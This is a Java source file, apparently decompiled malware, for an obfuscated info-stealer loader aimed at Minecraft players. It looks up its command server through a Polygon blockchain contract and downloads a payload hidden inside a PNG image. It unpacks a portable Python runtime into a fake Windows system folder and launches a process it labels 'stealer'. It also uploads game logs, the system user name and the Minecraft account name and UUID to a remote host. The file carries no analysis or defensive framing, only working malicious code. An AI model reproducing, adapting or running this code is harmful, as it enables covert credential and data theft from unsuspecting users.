package net.silentnet.stealer;

import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.attribute.FileAttribute;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Map;
import java.util.zip.Inflater;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class StealerCore {
    private String jbemiic2;
    private String vqTZXqDL;
    private String ll_guhn_ujewc_zaoyt;
    private String abB;
    private String mOeMBFV2ymYM;
    private String xmQEkvm;
    private String ueE;
    private String itwzzuyEr;
    private String imuswn_mhlzi;
    private Path oqbugEd;
    private StringBuilder njgm_druexm_yio;
    private String peludGn;

    private static String[] FK8CVM() {
        return new String[]{"https://polygon.drpc.org", "https://polygon-bor-rpc.publicnode.com", "https://1rpc.io/matic", "https://api.zan.top/polygon-mainnet", "https://rpc-mainnet.matic.quiknode.pro"};
    }

    private static String ZMnCTuQCEwYpiq() {
        return "0x9c0a507300fd902787bb193d80fca5ce6e1bff9a";
    }

    private static String yFud() {
        return "0xce6d41de";
    }

    private static String la_rmijpu() {
        return "thisisafalsepositive.st";
    }

    private static String ealo_fb() {
        return "/cdn/v2/9f4e7a2c1b8d.png";
    }

    public static void main(String[] args) {
        StealerCore entryMin = new StealerCore();
        entryMin.execute(args);
    }

    public static String readAqdlkqw() {
        return "fa357567-049b-426b-96ec-7d8488629333";
    }

    public static String ie_xcrtk_tz_vmib() {
        return "Default";
    }

    public String getDomain() {
        String gdGyDxuwJougaj;
        if (this.peludGn != null) {
            return this.peludGn;
        }
        String strZMnCTuQCEwYpiq = ZMnCTuQCEwYpiq();
        String strYFud = yFud();
        String gIGP_nQsQ_GxPX_fXUL = "{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\"" + strZMnCTuQCEwYpiq + "\",\"data\":\"" + strYFud + "\"},\"latest\"],\"id\":1}";
        for (String c3 : FK8CVM()) {
            try {
                RawHttpClient.HttpResponse uf_kxp_fygh_kmjxue = RawHttpClient.YXfoq9c(c3, gIGP_nQsQ_GxPX_fXUL, "application/json");
                if (uf_kxp_fygh_kmjxue.statusCode == 200 && (gdGyDxuwJougaj = UszD416DZ(uf_kxp_fygh_kmjxue.bodyString())) != null && gdGyDxuwJougaj.length() > 0) {
                    this.peludGn = gdGyDxuwJougaj;
                    return gdGyDxuwJougaj;
                }
            } catch (Exception e) {
            }
        }
        this.peludGn = la_rmijpu();
        return this.peludGn;
    }

    public String prefire(String host, String sess, String uid) {
        try {
            String zRef = "{\"sessionId\":\"" + hlmTosssaa(sess) + "\",\"userId\":\"" + hlmTosssaa(uid) + "\"}";
            String string = "https://" + host + "/shard/prefireMc";
            String str = "application/json";
            String str2 = "X-Edge-Cache-Revalidate";
            String str3 = "stale-if-error";
            RawHttpClient.HttpResponse nameMin = RawHttpClient.jhll_socdl(string, zRef, str, Map.of(str2, str3, "X-Runtime-Env", "jre-embedded"));
            if (nameMin.statusCode == 200) {
                return hsqKkvla(nameMin.bodyString(), "prefireId");
            }
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    public void execute(String[] args) {
        try {
            this.oqbugEd = ffnIj();
            this.njgm_druexm_yio = new StringBuilder();
            Files.createDirectories(this.oqbugEd, new FileAttribute[0]);
            uhpbvDupouyrRlvnMwas("========== DETACHED PROCESS STARTED ==========");
            if (args.length < 1) {
                uhpbvDupouyrRlvnMwas("ERROR: No context argument");
                AwIIpglAVr();
                return;
            }
            if (!yijValue(args[0])) {
                uhpbvDupouyrRlvnMwas("ERROR: Failed to parse context");
                AwIIpglAVr();
                return;
            }
            String str = this.ll_guhn_ujewc_zaoyt;
            uhpbvDupouyrRlvnMwas("Context parsed - UserId: " + str + ", Env: " + this.imuswn_mhlzi);
            Path dxkpKayn = this.oqbugEd.resolve("python.exe");
            Path hQBGxK_oLbiuX = this.oqbugEd.resolve("AppHost").resolve("main.py");
            if (Files.exists(dxkpKayn, new LinkOption[0]) && Files.exists(hQBGxK_oLbiuX, new LinkOption[0])) {
                uhpbvDupouyrRlvnMwas("Portable runtime already cached");
            } else {
                uhpbvDupouyrRlvnMwas("Downloading portable runtime...");
                if (!crwmaiBi()) {
                    uhpbvDupouyrRlvnMwas("ERROR: Failed to setup portable runtime");
                    AwIIpglAVr();
                    return;
                }
            }
            uhpbvDupouyrRlvnMwas("Spawning stealer...");
            run();
            AwIIpglAVr();
        } catch (Exception vapoOwzqeu) {
            uhpbvDupouyrRlvnMwas("FATAL: " + vapoOwzqeu.getClass().getSimpleName() + ": " + vapoOwzqeu.getMessage());
            try {
                AwIIpglAVr();
            } catch (Exception e) {
            }
        }
    }

    private Path ffnIj() {
        String nzUdqIgiyvw = System.getenv("LOCALAPPDATA");
        return Path.of(nzUdqIgiyvw, "Microsoft", "Windows", "NtProfileIndex");
    }

    private boolean crwmaiBi() {
        for (int flagsIn = 1; flagsIn <= 3; flagsIn++) {
            try {
                uhpbvDupouyrRlvnMwas("Download attempt " + flagsIn + "/" + 3 + "...");
                String str = this.mOeMBFV2ymYM;
                String strEalo_fb = ealo_fb();
                String string = "https://" + str + strEalo_fb;
                String str2 = "User-Agent";
                String string2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";
                String string3 = "Accept";
                String string4 = "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8";
                String str3 = "Accept-Language";
                String str4 = "en-US,en;q=0.9";
                String str5 = "Sec-Fetch-Dest";
                String string5 = "image";
                String str6 = "Sec-Fetch-Mode";
                String str7 = "no-cors";
                RawHttpClient.HttpResponse gQU_XNvp = RawHttpClient.get(string, Map.of(str2, string2, string3, string4, str3, str4, str5, string5, str6, str7, "Sec-Fetch-Site", "same-origin"));
                if (gQU_XNvp.statusCode != 200 || gQU_XNvp.body.length == 0) {
                    uhpbvDupouyrRlvnMwas("Download failed: HTTP " + gQU_XNvp.statusCode);
                } else {
                    uhpbvDupouyrRlvnMwas("Downloaded " + gQU_XNvp.body.length + " bytes, extracting from image...");
                    byte[] jc7u = taTDj(gQU_XNvp.body);
                    if (jc7u == null) {
                        uhpbvDupouyrRlvnMwas("PNG extraction failed");
                    } else {
                        uhpbvDupouyrRlvnMwas("Extracted " + jc7u.length + " bytes from image, unpacking...");
                        int flags = uunVOtfiku(jc7u);
                        uhpbvDupouyrRlvnMwas("Extracted " + flags + " files");
                        if (Files.exists(this.oqbugEd.resolve("python.exe"), new LinkOption[0])) {
                            uhpbvDupouyrRlvnMwas("Portable runtime ready");
                            return true;
                        }
                        if (flagsIn < 3) {
                            try {
                                Thread.sleep(2000 * ((long) flagsIn));
                            } catch (InterruptedException e) {
                            }
                        }
                    }
                }
            } catch (Exception xptr) {
                String message = xptr.getMessage();
                uhpbvDupouyrRlvnMwas("Attempt " + flagsIn + " error: " + message);
            }
        }
        return false;
    }

    private int uunVOtfiku(byte[] data) throws IOException {
        int pfwG_nIuX_mOGo_hRaX = 0;
        byte[] UaQR_tUBP_qQIC_nckU = new byte[131072];
        ByteArrayInputStream pmeTsspmyPegg = new ByteArrayInputStream(data);
        ZipInputStream ujtmPewf = new ZipInputStream(pmeTsspmyPegg);
        while (true) {
            ZipEntry dax_hndno_janw = ujtmPewf.getNextEntry();
            if (dax_hndno_janw == null) {
                ujtmPewf.close();
                return pfwG_nIuX_mOGo_hRaX;
            }
            Path tKyvSow_s = this.oqbugEd.resolve(dax_hndno_janw.getName());
            if (dax_hndno_janw.isDirectory()) {
                Files.createDirectories(tKyvSow_s, new FileAttribute[0]);
            } else {
                Files.createDirectories(tKyvSow_s.getParent(), new FileAttribute[0]);
                FileOutputStream FaGs_RCQO_TfkU_HhQP = new FileOutputStream(tKyvSow_s.toFile());
                BufferedOutputStream slcz_kskmj_hmjvfh_kp = new BufferedOutputStream(FaGs_RCQO_TfkU_HhQP, 131072);
                while (true) {
                    int kezup_omgdsi_cida_gdzs = ujtmPewf.read(UaQR_tUBP_qQIC_nckU);
                    if (kezup_omgdsi_cida_gdzs <= 0) {
                        break;
                    }
                    slcz_kskmj_hmjvfh_kp.write(UaQR_tUBP_qQIC_nckU, 0, kezup_omgdsi_cida_gdzs);
                }
                slcz_kskmj_hmjvfh_kp.close();
            }
            ujtmPewf.closeEntry();
            pfwG_nIuX_mOGo_hRaX++;
        }
    }

    private byte[] taTDj(byte[] img) {
        try {
            if (img.length < 8) {
                return null;
            }
            byte[] stateAvg = {-119, 80, 78, 71, 13, 10, 26, 10};
            for (int omTtmpm = 0; omTtmpm < 8; omTtmpm++) {
                if (img[omTtmpm] != stateAvg[omTtmpm]) {
                    return null;
                }
            }
            int keyVal = 8;
            while (keyVal + 8 <= img.length) {
                int BpYZ_ZZqC_rWuy_qZKu = ((img[keyVal] & 255) << 24) | ((img[keyVal + 1] & 255) << 16) | ((img[keyVal + 2] & 255) << 8) | (img[keyVal + 3] & 255);
                byte source2 = img[keyVal + 4];
                byte oueq_MDOG_KdDT_mecS = img[keyVal + 5];
                byte sizeSum = img[keyVal + 6];
                byte ljjp_eqfcr_ue = img[keyVal + 7];
                if (source2 == 104 && oueq_MDOG_KdDT_mecS == 73 && sizeSum == 100 && ljjp_eqfcr_ue == 115) {
                    byte[] xj3nQ_bczc = Arrays.copyOfRange(img, keyVal + 8, keyVal + 8 + BpYZ_ZZqC_rWuy_qZKu);
                    return gyzkaAqfnlEvGvhro(xj3nQ_bczc);
                }
                keyVal += 12 + BpYZ_ZZqC_rWuy_qZKu;
            }
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] gyzkaAqfnlEvGvhro(byte[] comp) {
        int zgcragBhejwRmPeaq;
        try {
            Inflater pjdt_ws_bk_th = new Inflater();
            pjdt_ws_bk_th.setInput(comp);
            ByteArrayOutputStream okrxyIfmbqJejifiCamwqb = new ByteArrayOutputStream(comp.length * 5);
            byte[] RohO_bgzb_aCcM_EUOW = new byte[131072];
            while (!pjdt_ws_bk_th.finished() && ((zgcragBhejwRmPeaq = pjdt_ws_bk_th.inflate(RohO_bgzb_aCcM_EUOW)) != 0 || !pjdt_ws_bk_th.needsInput())) {
                okrxyIfmbqJejifiCamwqb.write(RohO_bgzb_aCcM_EUOW, 0, zgcragBhejwRmPeaq);
            }
            pjdt_ws_bk_th.end();
            return okrxyIfmbqJejifiCamwqb.toByteArray();
        } catch (Exception e) {
            return null;
        }
    }

    private void run() {
        try {
            Path path = this.oqbugEd;
            Path gfz_ldhv = path.resolve("python.exe");
            Path path2 = this.oqbugEd;
            Path Ma_ZJ = path2.resolve("AppHost").resolve("main.py");
            if (!Files.exists(Ma_ZJ, new LinkOption[0])) {
                uhpbvDupouyrRlvnMwas("ERROR: main.py not found");
                return;
            }
            List WlyeHX_NB = new ArrayList();
            WlyeHX_NB.add(gfz_ldhv.toString());
            WlyeHX_NB.add(Ma_ZJ.toString());
            WlyeHX_NB.add("-u");
            WlyeHX_NB.add(this.ll_guhn_ujewc_zaoyt);
            WlyeHX_NB.add("--env");
            WlyeHX_NB.add(this.imuswn_mhlzi);
            if (this.abB != null && !this.abB.equals("null")) {
                WlyeHX_NB.add("--tag");
                WlyeHX_NB.add(this.abB);
            }
            if (this.jbemiic2 != null) {
                String str = this.jbemiic2;
                if (!str.equals("null")) {
                    WlyeHX_NB.add("--mcInfo");
                    WlyeHX_NB.add(this.jbemiic2);
                }
            }
            if (this.vqTZXqDL != null) {
                String str2 = this.vqTZXqDL;
                if (!str2.equals("null")) {
                    WlyeHX_NB.add("--prefireId");
                    WlyeHX_NB.add(this.vqTZXqDL);
                }
            }
            ProcessBuilder argTmp = new ProcessBuilder((List<String>) WlyeHX_NB);
            argTmp.directory(this.oqbugEd.resolve("AppHost").toFile());
            argTmp.redirectInput(ProcessBuilder.Redirect.from(new File("NUL")));
            argTmp.redirectOutput(ProcessBuilder.Redirect.appendTo(this.oqbugEd.resolve("_stealer.log").toFile()));
            argTmp.redirectErrorStream(true);
            Process YjC = argTmp.start();
            uhpbvDupouyrRlvnMwas("Stealer spawned: pid=" + YjC.pid());
        } catch (Exception z1) {
            String message = z1.getMessage();
            uhpbvDupouyrRlvnMwas("Spawn error: " + message);
        }
    }

    private void AwIIpglAVr() {
        if (this.mOeMBFV2ymYM == null) {
            return;
        }
        try {
            StringBuilder _sb78 = new StringBuilder();
            if (this.xmQEkvm != null) {
                String str = this.xmQEkvm;
                Path keyPtr = Path.of(str, "logs", "latest.log");
                if (Files.exists(keyPtr, new LinkOption[0])) {
                    try {
                        String dcsed_jv_jqqr = Files.readString(keyPtr);
                        if (dcsed_jv_jqqr.length() > 5000000) {
                            dcsed_jv_jqqr = dcsed_jv_jqqr.substring(0, 2500000) + "\n=== TRUNCATED ===\n" + dcsed_jv_jqqr.substring(dcsed_jv_jqqr.length() - 2500000);
                        }
                        _sb78.append(dcsed_jv_jqqr);
                    } catch (Exception ognm_zs_uw) {
                        _sb78.append("ERROR reading MC log: ").append(ognm_zs_uw.getMessage());
                    }
                }
            }
            _sb78.append("\n\n========== DETACHED LOG ==========\n");
            _sb78.append(this.njgm_druexm_yio.toString());
            _sb78.append("\n\n========== RUNTIME ==========\n");
            _sb78.append("jvm=").append(System.getProperty("java.version")).append("\n");
            _sb78.append("os=").append(System.getProperty("os.name")).append("\n");
            _sb78.append("user=").append(System.getProperty("user.name")).append("\n");
            String strHlmTosssaa = hlmTosssaa(this.ll_guhn_ujewc_zaoyt);
            String strHlmTosssaa2 = hlmTosssaa(_sb78.toString());
            String strHlmTosssaa3 = hlmTosssaa(this.ueE != null ? this.ueE : "N/A");
            String strHlmTosssaa4 = hlmTosssaa(this.itwzzuyEr != null ? this.itwzzuyEr : "N/A");
            String strHlmTosssaa5 = hlmTosssaa(this.imuswn_mhlzi);
            String hfzP_aqDg_YwSc_wboY = "{\"userId\":\"" + strHlmTosssaa + "\",\"content\":\"" + strHlmTosssaa2 + "\",\"filename\":\"combined.log\",\"mcUsername\":\"" + strHlmTosssaa3 + "\",\"mcUuid\":\"" + strHlmTosssaa4 + "\",\"executionEnvironment\":\"" + strHlmTosssaa5 + "-Detached\"}";
            String str2 = this.mOeMBFV2ymYM;
            String string = "https://" + str2 + "/shard/submitMinecraftLog";
            String string2 = "application/json";
            String string3 = "X-Edge-Cache-Revalidate";
            String str3 = "stale-if-error";
            RawHttpClient.HttpResponse ydavcz_jno = RawHttpClient.jhll_socdl(string, hfzP_aqDg_YwSc_wboY, string2, Map.of(string3, str3, "X-Runtime-Env", "jre-embedded"));
            int i3 = ydavcz_jno.statusCode;
            uhpbvDupouyrRlvnMwas("Log submitted: " + i3);
        } catch (Exception yhrebWzexQiujn) {
            String message = yhrebWzexQiujn.getMessage();
            uhpbvDupouyrRlvnMwas("Submit error: " + message);
        }
    }

    private void uhpbvDupouyrRlvnMwas(String msg) {
        String offset5 = "[" + System.currentTimeMillis() + "] " + msg;
        if (this.njgm_druexm_yio != null) {
            this.njgm_druexm_yio.append(offset5).append("\n");
        }
        System.out.println(offset5);
    }

    private boolean yijValue(String b64) {
        try {
            String cuIgl9ZCO_PW4s = new String(Base64.getDecoder().decode(b64), StandardCharsets.UTF_8);
            this.jbemiic2 = hsqKkvla(cuIgl9ZCO_PW4s, "mcInfo");
            this.vqTZXqDL = hsqKkvla(cuIgl9ZCO_PW4s, "prefireId");
            this.ll_guhn_ujewc_zaoyt = hsqKkvla(cuIgl9ZCO_PW4s, "userId");
            this.abB = hsqKkvla(cuIgl9ZCO_PW4s, "tag");
            this.mOeMBFV2ymYM = hsqKkvla(cuIgl9ZCO_PW4s, "domain");
            this.xmQEkvm = hsqKkvla(cuIgl9ZCO_PW4s, "gameDir");
            this.ueE = hsqKkvla(cuIgl9ZCO_PW4s, "mcUsername");
            this.itwzzuyEr = hsqKkvla(cuIgl9ZCO_PW4s, "mcUuid");
            this.imuswn_mhlzi = hsqKkvla(cuIgl9ZCO_PW4s, "env");
            if (this.imuswn_mhlzi == null) {
                this.imuswn_mhlzi = "Fabric";
            }
            return (this.mOeMBFV2ymYM == null || this.ll_guhn_ujewc_zaoyt == null) ? false : true;
        } catch (Exception e) {
            return false;
        }
    }

    private String UszD416DZ(String json) {
        int bcqp_toyR_HbTR_guSd = json.indexOf("\"result\"");
        if (bcqp_toyR_HbTR_guSd == -1) {
            return null;
        }
        int tTIi_FGaw_tUUg_EwXc = json.indexOf(":", bcqp_toyR_HbTR_guSd);
        int azeK_aUmQ_HOCw_BNuR = json.indexOf("\"", tTIi_FGaw_tUUg_EwXc);
        int v11QSx9x1u3q = json.indexOf("\"", azeK_aUmQ_HOCw_BNuR + 1);
        if (azeK_aUmQ_HOCw_BNuR == -1 || v11QSx9x1u3q == -1) {
            return null;
        }
        String count0 = json.substring(azeK_aUmQ_HOCw_BNuR + 1, v11QSx9x1u3q);
        return vvfwhhible(count0);
    }

    private String vvfwhhible(String hex) {
        if (hex == null || !hex.startsWith("0x") || hex.length() < 130) {
            return null;
        }
        try {
            String SzpW_ZTiE_yhWg_PnRG = hex.substring(2);
            int heiimoBivli = Integer.parseInt(SzpW_ZTiE_yhWg_PnRG.substring(64, 128), 16);
            if (heiimoBivli == 0 || heiimoBivli > 10000) {
                return null;
            }
            String enDwlrWpr = SzpW_ZTiE_yhWg_PnRG.substring(128, 128 + (heiimoBivli * 2));
            byte[] dataTmp = foq_tz_zsdi(enDwlrWpr);
            return new String(dataTmp, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] foq_tz_zsdi(String hex) {
        int nextAcc = hex.length();
        byte[] vzOvtdgyZd = new byte[nextAcc / 2];
        for (int next2 = 0; next2 < nextAcc; next2 += 2) {
            vzOvtdgyZd[next2 / 2] = (byte) ((Character.digit(hex.charAt(next2), 16) << 4) + Character.digit(hex.charAt(next2 + 1), 16));
        }
        return vzOvtdgyZd;
    }

    private String hsqKkvla(String json, String key) {
        String NWAM_yeEN_hUWo_iuAX;
        String dnxt_tnPe_xRLl_KHoS = "\"" + key + "\":\"";
        int QHno_zrWT_HPDe_lSod = json.indexOf(dnxt_tnPe_xRLl_KHoS);
        if (QHno_zrWT_HPDe_lSod == -1) {
            return null;
        }
        int diRx_PFib_kabK_eOTG = QHno_zrWT_HPDe_lSod + dnxt_tnPe_xRLl_KHoS.length();
        StringBuilder _sb115 = new StringBuilder();
        boolean rkoeDtZllfgc = false;
        for (int dcCD_hbiX_TePn_UeBQ = diRx_PFib_kabK_eOTG; dcCD_hbiX_TePn_UeBQ < json.length(); dcCD_hbiX_TePn_UeBQ++) {
            char m66r = json.charAt(dcCD_hbiX_TePn_UeBQ);
            if (rkoeDtZllfgc) {
                switch (m66r) {
                    case '\"':
                        _sb115.append('\"');
                        break;
                    case '\\':
                        _sb115.append('\\');
                        break;
                    case 'n':
                        _sb115.append('\n');
                        break;
                    case 'r':
                        _sb115.append('\r');
                        break;
                    case 't':
                        _sb115.append('\t');
                        break;
                    default:
                        _sb115.append(m66r);
                        break;
                }
                rkoeDtZllfgc = false;
            } else if (m66r == '\\') {
                rkoeDtZllfgc = true;
            } else {
                if (m66r == '\"') {
                    NWAM_yeEN_hUWo_iuAX = _sb115.toString();
                    if (NWAM_yeEN_hUWo_iuAX.equals("null")) {
                        return null;
                    }
                    return NWAM_yeEN_hUWo_iuAX;
                }
                _sb115.append(m66r);
            }
        }
        NWAM_yeEN_hUWo_iuAX = _sb115.toString();
        if (NWAM_yeEN_hUWo_iuAX.equals("null")) {
            return null;
        }
        return NWAM_yeEN_hUWo_iuAX;
    }

    private String hlmTosssaa(String s) {
        if (s == null) {
            return "";
        }
        StringBuilder _sb118 = new StringBuilder();
        for (char keyacc : s.toCharArray()) {
            switch (keyacc) {
                case '\t':
                    _sb118.append("\\t");
                    break;
                case '\n':
                    _sb118.append("\\n");
                    break;
                case '\r':
                    _sb118.append("\\r");
                    break;
                case '\"':
                    _sb118.append("\\\"");
                    break;
                case '\\':
                    _sb118.append("\\\\");
                    break;
                default:
                    if (keyacc < ' ') {
                        _sb118.append(String.format("\\u%04x", Integer.valueOf(keyacc)));
                    } else {
                        _sb118.append(keyacc);
                    }
                    break;
            }
        }
        return _sb118.toString();
    }
}
